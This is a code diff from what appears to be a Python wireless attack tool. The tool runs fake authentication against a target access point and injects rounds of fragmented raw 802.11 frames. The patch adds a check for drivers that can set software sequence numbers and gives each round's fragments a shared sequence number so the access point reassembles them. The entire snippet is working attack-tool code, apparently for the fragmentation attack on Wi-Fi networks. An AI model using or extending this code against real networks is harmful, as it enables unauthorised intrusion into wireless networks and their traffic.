@@ -303,15 +303,29 @@ async def main_async(args) -> int:
         probe = FragProbe(iface, target.bssid, fake_auth.source_mac, seed_iv)
         iface.register_rx_callback(probe.rx_cb)
 
+        # Fragmentation REQUIRES a software-supplied sequence number so all
+        # fragments of one round share one seq (else the chip's HW seq counter
+        # gives each its own → the AP can't reassemble). Bail loudly if the
+        # driver can't, rather than silently sending un-reassemblable frames.
+        if not iface.supports_sw_seq:
+            fake_auth.stop()
+            fail(f"{iface.description} can't inject a software sequence number "
+                 "(driver.SUPPORTS_SW_SEQ). Fragment trains would be sent with "
+                 "per-frame HW seq and never reassemble. Use an sw_seq-capable "
+                 "card (e.g. rtl8821au).")
+
         step(f"Inject fragment rounds for {args.inject_secs:.0f}s "
              f"(dumping ALL RX)")
         rounds = 0
         end = time.time() + args.inject_secs
         try:
             while time.time() < end:
+                # Roll the shared seq per round so the AP doesn't see each
+                # round as a duplicate retransmit of the previous one.
+                sw_seq = rounds & 0xFFF
                 probe._burst_active = True
                 for fr in frags:
-                    await iface.send_raw(fr, use_no_ack=True)
+                    await iface.send_raw(fr, use_no_ack=True, sw_seq=sw_seq)
                 probe._burst_active = False
                 rounds += 1
                 await asyncio.sleep(args.round_gap)   # RX window for the relay
